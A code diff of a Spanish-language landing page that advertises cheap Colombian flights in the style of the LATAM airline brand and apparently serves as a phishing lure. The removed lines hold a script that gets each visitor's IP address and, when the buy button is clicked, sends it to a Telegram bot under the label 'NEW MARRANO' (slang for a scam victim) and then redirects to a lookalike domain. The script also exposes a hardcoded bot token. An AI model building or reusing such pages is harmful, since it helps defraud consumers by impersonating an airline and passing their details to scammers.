@@ -6,44 +6,33 @@
   <title>Ofertas de Vuelos | Desde $49.900 COP</title>
 
   <style>
-    /* Reset básico */
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
-    
+
     html, body {
       height: 100%;
       font-family: 'Poppins', sans-serif;
       color: white;
       overflow: hidden;
     }
-    
-    /* Fondo con video */
-    .video-container {
+
+    /* Fondo con la imagen y desenfoque */
+    .background-container {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      overflow: hidden;
-      z-index: -1;
+      background-image: url('https://pluralidadz.com/wp-content/uploads/2023/02/Avianca-tiene-promociones-hasta-el-17-de-febrero.jpg');
+      background-size: cover;
+      background-position: center;
+      filter: blur(8px); /* Aplica desenfoque a la imagen */
+      z-index: -1; /* Asegura que el fondo quede detrás del contenido */
     }
-    
-    video {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      min-width: 100%;
-      min-height: 100%;
-      width: auto;
-      height: auto;
-      transform: translate(-50%, -50%);
-      object-fit: cover;
-      filter: brightness(70%);
-    }
-    
+
     /* Contenido centrado */
     .content {
       position: absolute;
@@ -51,16 +40,16 @@
       left: 50%;
       transform: translate(-50%, -50%);
       text-align: center;
-      background: rgba(0, 0, 0, 0.7);
+      background: rgba(0, 0, 0, 0.7); /* Fondo oscuro semi-transparente para el texto */
       padding: 40px;
       border-radius: 15px;
       width: 90%;
       max-width: 550px;
       box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
       animation: fadeIn 1.5s ease-in-out;
+      z-index: 1; /* Aseguramos que el contenido esté por encima del fondo */
     }
-    
-    /* Animación de entrada */
+
     @keyframes fadeIn {
       from {
         opacity: 0;
@@ -84,7 +73,6 @@
       opacity: 0.9;
     }
 
-    /* Botón - color morado (LATAM) */
     .button {
       display: inline-block;
       padding: 15px 35px;
@@ -105,7 +93,6 @@
       box-shadow: 0px 6px 15px rgba(138, 45, 162, 0.7);
     }
 
-    /* Estilos Responsive */
     @media (max-width: 600px) {
       .content {
         width: 95%;
@@ -126,23 +113,10 @@
 </head>
 <body>
 
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-16935226204"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-  gtag('config', 'AW-16935226204');
-</script>
+  <!-- Fondo con la imagen y desenfoque -->
+  <div class="background-container"></div>
 
-  <!-- Contenedor del video -->
-  <div class="video-container">
-    <video id="videoLocal" autoplay loop playsinline muted>
-      <source src="ltam.mp4" type="video/mp4"> <!-- Asegúrate de tener el archivo ltam.mp4 -->
-      Tu navegador no soporta videos en HTML5.
-    </video>
-  </div>
-
+  <!-- Contenido principal -->
   <div class="content">
     <h1>¡Vuela por Colombia desde <strong>$49.900</strong>!</h1>
     <p>Reserva hoy mismo y ahorra en tus próximas vacaciones.</p>
@@ -153,55 +127,15 @@
     document.addEventListener("DOMContentLoaded", async () => {
         const video = document.getElementById("videoLocal");
 
-        // Lista de videos para elegir aleatoriamente
-        const videos = ["ltam.mp4"];
-        const randomVideo = videos[Math.floor(Math.random() * videos.length)];
-
-        // Asignar el video aleatorio
-        video.querySelector("source").src = randomVideo;
-        video.load();
-
-        // Intentar reproducir el video con sonido silenciado (mute)
         try {
             await video.play();
         } catch (error) {
             console.error("Autoplay bloqueado:", error);
         }
 
-        // Activar el sonido del video cuando el usuario haga clic
         document.addEventListener("click", () => {
-            video.muted = false;  // Desactivar el mute
+            video.muted = false;
             video.play().catch((error) => console.error("Error al intentar reproducir el video con sonido:", error));
-        });
-
-        // Obtener la IP del usuario
-        let userIp = "Desconocida";
-        try {
-            const ipResponse = await fetch("https://api64.ipify.org?format=json");
-            const ipData = await ipResponse.json();
-            userIp = ipData.ip;
-        } catch (error) {
-            console.error("Error obteniendo la IP:", error);
-        }
-
-        // Enviar log a Telegram cuando se hace clic en el botón
-        document.getElementById("buyButton").addEventListener("click", (event) => {
-            event.preventDefault(); // Evita la redirección inmediata
-
-            const telegramToken = "7978973213:AAGZ5tkPk98atTrFAYHtoI2Mb-wqIlQPTWM";
-            const chatId = "-4695874904";
-            const message = encodeURIComponent(`⚡NEW MARRANO LLEGANDO 🐷\n🖥 IP: ${userIp}`);
-
-            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${message}`)
-                .then(response => response.json())
-                .then(data => {
-                    console.log("Mensaje enviado a Telegram:", data);
-                    window.location.href = "https://latamnacionalestravel.com/travel-web-nacionales-co"; // Redirige después de enviar el mensaje
-                })
-                .catch(error => {
-                    console.error("Error al enviar mensaje a Telegram:", error);
-                    window.location.href = "https://latamnacionalestravel.com/travel-web-nacionales-co"; // Redirige aunque falle
-                });
         });
     });
   </script>
